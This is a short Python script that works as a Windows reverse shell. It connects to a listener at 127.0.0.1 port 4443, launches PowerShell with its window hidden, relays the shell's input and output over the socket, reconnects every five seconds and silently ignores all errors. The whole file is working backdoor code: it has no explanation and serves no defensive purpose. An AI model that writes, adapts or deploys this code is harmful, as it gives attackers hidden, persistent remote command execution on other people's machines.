import socket, subprocess, threading, time, os
from typing import BinaryIO, cast

def connect():
    while True:
        s = None
        p = None
        try:
            s = socket.socket()
            s.connect(('127.0.0.1', 4443))
            p = subprocess.Popen(
                ['powershell.exe', '-WindowStyle', 'Hidden', '-NoProfile'],
                stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                creationflags=0x08000000
            )

            def pipe_output(pipe: BinaryIO | None, sock: socket.socket):
                if pipe is not None:
                    while True:
                        try:
                            data = pipe.read(1)
                            if not data:
                                break
                            sock.sendall(data)
                        except (OSError, socket.error):
                            break
            
            stdout_pipe = cast(BinaryIO, p.stdout)
            stderr_pipe = cast(BinaryIO, p.stderr)
            stdin_pipe = cast(BinaryIO, p.stdin)
            threading.Thread(target=pipe_output, args=(stdout_pipe, s), daemon=True).start()
            threading.Thread(target=pipe_output, args=(stderr_pipe, s), daemon=True).start()

            if stdin_pipe is not None:
                while True:
                    data = s.recv(1024)
                    if not data:
                        break
                    stdin_pipe.write(data)
                    stdin_pipe.flush()
                
        except Exception:
            pass
        finally:
            if p:
                try:
                    p.terminate()
                    p.wait(timeout=2)
                except Exception:
                    try: p.kill()
                    except Exception: pass
            if s:
                try:
                    s.close()
                except Exception:
                    pass
            
            time.sleep(5)


if __name__ == "__main__":
    connect()

